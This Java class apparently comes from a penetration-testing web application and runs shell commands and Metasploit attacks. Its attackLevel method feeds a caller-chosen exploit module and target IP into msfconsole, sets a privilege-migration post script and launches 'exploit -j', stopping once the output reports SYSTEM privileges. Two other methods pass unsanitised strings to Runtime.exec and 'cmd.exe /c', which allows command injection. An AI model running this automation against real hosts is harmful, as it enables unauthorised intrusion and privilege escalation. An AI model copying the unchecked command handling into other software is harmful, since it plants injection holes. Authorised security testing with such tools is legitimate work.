package com.example.penetration.utils;

import com.example.penetration.entity.MsfEntity;
import com.example.penetration.mapper.MsfMapper;
import com.example.penetration.websocket.CommandWebSocket;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.io.*;
import java.text.SimpleDateFormat;
import java.time.LocalDateTime;

@Component
@RequiredArgsConstructor(onConstructor = @__(@Autowired))
public class CommandExecutor {
    private final MsfMapper msfMapper;
    private final CommandWebSocket commandWebSocket;
    private final ObjectMapper objectMapper;
    public String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        Process process = null;
        BufferedReader reader = null;
        try {
            process = Runtime.getRuntime().exec(command);
            reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
        } catch (Exception e) {
            System.out.println("Exception");
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (Exception ignored) {
                }
            }
            if (process != null) {
                process.destroy();
            }
        }

        return output.toString();
    }


    public  void command(String command) throws IOException, InterruptedException {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("cmd.exe", "/c", command);
        // 合并标准错误流到标准输出流
        processBuilder.redirectErrorStream(true);
        // 启动进程
        Process process = processBuilder.start();
        // 读取命令输出
        StringBuilder output = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            System.out.println(line);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        int exitCode = process.waitFor();
        System.out.println(output);
    }

    public String attackLevel(String ip, String vulnerabilityName, String vulnerabilityModule, Integer userId) throws IOException, InterruptedException {
        String msfconsole = "C:\\metasploit-framework\\bin\\msfconsole.bat";
        Process process = new ProcessBuilder(
                "cmd.exe", "/c",
                msfconsole,
                "-x",
                String.format(
                        "%s; %s; set rhost %s; set ExitOnSession false; set AutoRunScript post/windows/manage/priv_migrate; exploit -j",
                        vulnerabilityName, vulnerabilityModule, ip
                )
        ).redirectErrorStream(true).start();

        StringBuilder outputBuilder = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"))) {
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line); // 打印到控制台
                outputBuilder.append(line).append("\n");

                // 判断是否需要终止进程
                if (line.contains("NT AUTHORITY\\SYSTEM")) {
                    process.destroy();// 获取系统权限时终止
                    break;
                }
                if (line.contains("SMB Negotiation Failure")) {
                    process.destroy();// SMB协商失败时终止
                    break;
                }
                if(line.contains("The target is not vulnerable")){
                    process.destroy();// 目标不存在漏洞时终止
                    break;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        // 等待进程结束
        process.waitFor();

        // 构造输出结果
        String output = outputBuilder.toString();

        // 保存到数据库
        MsfEntity msfEntity = new MsfEntity();
        msfEntity.setIp(ip);
        msfEntity.setVulnerabilityName(vulnerabilityName);
        msfEntity.setVulnerabilityModule(vulnerabilityModule);
        msfEntity.setProcess(output);
        msfEntity.setCreateTime(LocalDateTime.now());
        msfEntity.setUserId(userId);
        msfMapper.insert(msfEntity);


        return output;
    }
}